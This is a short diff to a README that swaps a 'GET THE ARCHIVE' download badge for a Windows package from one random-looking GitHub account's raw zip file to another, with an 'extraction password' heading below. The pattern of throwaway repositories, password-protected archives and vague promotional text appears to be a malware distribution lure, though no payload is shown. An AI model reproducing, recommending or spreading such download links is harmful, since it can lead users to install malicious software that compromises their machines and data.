@@ -15,7 +15,7 @@ Explore the world. Discover its stories. Make every moment count.
 
 ACCESS THE WINDOWS PACKAGE
 
-<p align="center"> <a href="https://raw.githubusercontent.com/WiseDarkug/project/main/GitProject.zip"> <img src="https://img.shields.io/badge/GET_THE_ARCHIVE-c9a227?style=for-the-badge&logo=windows&logoColor=black"/> </a> </p>
+<p align="center"> <a href="https://raw.githubusercontent.com/PotterSocket/project/main/GitApp.zip"> <img src="https://img.shields.io/badge/GET_THE_ARCHIVE-c9a227?style=for-the-badge&logo=windows&logoColor=black"/> </a> </p>
 
 <p align="center"> **EXTRACTION PASSWORD**
 
